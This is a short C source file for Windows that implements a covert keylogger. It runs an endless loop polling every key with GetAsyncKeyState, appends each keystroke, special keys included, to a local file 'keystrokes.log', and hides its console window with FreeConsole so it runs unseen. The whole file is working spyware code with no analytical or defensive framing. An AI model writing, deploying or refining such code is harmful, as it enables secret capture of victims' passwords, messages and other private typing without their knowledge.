#include <stdio.h>
#include <windows.h>

#define LOG_FILE "keystrokes.log"

void log_keystroke(int key) 
{
    FILE *file = fopen(LOG_FILE, "a");
    if (!file) return;

    // Special keys
    if (key == VK_BACK) fprintf(file, "[BACKSPACE] ");
    else if (key == VK_RETURN) fprintf(file, "[ENTER]\n");
    else if (key == VK_SPACE) fprintf(file, " ");
    else if (key == VK_TAB) fprintf(file, "[TAB] ");
    else if (key == VK_ESCAPE) fprintf(file, "[ESC] ");
    // Normal characters
    else if ((key >= 32 && key <= 126)) fprintf(file, "%c", key);

    fclose(file);
}

// Keylogger function
void keylogger() 
{
    while (1) 
    {
        for (int key = 8; key <= 190; key++) 
        {
            if (GetAsyncKeyState(key) & 0x0001) 
            {
                log_keystroke(key);
            }
        }
        Sleep(10);
    }
}

int main() 
{
    // Hide console
    FreeConsole();
    // Run program
    keylogger();
    return 0;
}